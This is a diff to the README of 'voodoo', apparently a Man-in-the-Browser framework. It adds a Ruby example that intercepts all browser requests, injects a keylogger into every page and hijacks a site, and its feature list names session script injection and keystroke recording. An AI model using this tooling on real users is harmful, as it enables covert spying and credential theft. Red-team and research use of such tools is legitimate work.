@@ -14,7 +14,7 @@ Man in the Browser Framework
 
 ## Features
 * 📜 Content Scripts - inject arbitrary JavaScript to user session
-* 🔍 Interceptor - intercept all browser requests (url, headers, body, etc)
+* 🔍 Interceptor - intercept browser requests (url, headers, body, etc)
 * 🔑 Keylogger - records user keystrokes on any site
 
 ## Requirements
@@ -59,3 +59,26 @@ Options:
 
 add a content script
 ```
+
+## Ruby API
+
+```rb
+require 'voodoo'
+
+browser = VOODOO::Browser.Chrome
+                       # .Opera
+                       # .Edge
+
+# Intercept all browser requests
+browser.intercept do |req|
+    puts "#{req[:method]} #{req[:url]}"
+end
+
+# Inject keylogger to every page
+browser.keylogger do |event|
+    print event[:log]
+end
+
+browser.hijack 'https://example.com'
+```
+
